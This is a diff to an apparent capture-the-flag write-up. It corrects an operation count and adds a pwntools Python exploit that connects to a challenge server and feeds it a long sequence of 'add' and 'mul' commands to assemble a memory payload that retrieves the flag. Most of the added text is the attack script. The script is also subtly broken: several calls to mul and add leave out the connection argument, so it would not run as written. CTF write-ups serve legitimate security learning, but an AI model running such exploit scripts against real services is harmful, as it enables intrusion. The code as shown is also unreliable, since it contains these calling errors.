@@ -180,5 +180,63 @@ address 1000 + 0x590 - 4 = 2420 = 0x974)
 0000097 8000000 000000
 ```
 
-Each of these groups of 7, except for the last one, takes two operations to insert, so we need 53 operations --
-a total of 578 + 53 = 631 operations!
+Each of these groups of 7, except for the all-zeroes groups, takes two operations to insert, so we need
+1 + 2 * 17 + 10 = 45 operations for the payload -- a total of 577 + 45 = 622 operations.
+
+```python
+from Crypto.Util.number import bytes_to_long, long_to_bytes
+from pwn import *
+
+
+def add(p: remote, n: int):
+    p.sendline(b"add ")
+    p.sendline(long_to_bytes(n, blocksize=4))
+
+
+def mul(p: remote, n: int):
+    p.sendline(b"mul ")
+    p.sendline(long_to_bytes(n, blocksize=4))
+
+
+def add_word(p: remote, n: int):
+    assert n < 0x10000000
+    mul(0x10000000)
+    add(n)
+
+
+with remote("kek.cx", 6969) as p:
+    for _ in range(577):
+        mul(0xffffffff)
+
+    add(p, bytes_to_long(b"flag") + 1)
+    mul(p, 0x10000000)
+    add_word(p, 0x1006563)
+    add_word(p, 0x7800000)
+    add_word(p, 0x9740000)
+    mul(p, 0x10000000)
+    add_word(p, 0x000DD00)
+    add_word(p, 0x0000020)
+    add_word(p, 0x0656378)
+    add_word(p, 0x0065627)
+    add_word(p, 0x8000000)
+    add_word(p, 0x0F00656)
+    add_word(p, 0x2780000)
+    add_word(p, 0x0974000)
+    mul(p, 0x10000000)
+    add_word(p, 0x0000DD0)
+    mul(p, 0x10000000)
+    add_word(p, 0x0065637)
+    add_word(p, 0x8000000)
+    mul(p, 0x10000000)
+    mul(p, 0x10000000)
+    mul(p, 0x10000000)
+    mul(p, 0x10000000)
+    mul(p, 0x10000000)
+    add_word(p, 0x000000C)
+    add_word(p, 0x0000097)
+    add_word(p, 0x8000000)
+    mul(p, 0x1000000)
+
+    # Done
+    p.sendline(b"done")
+```
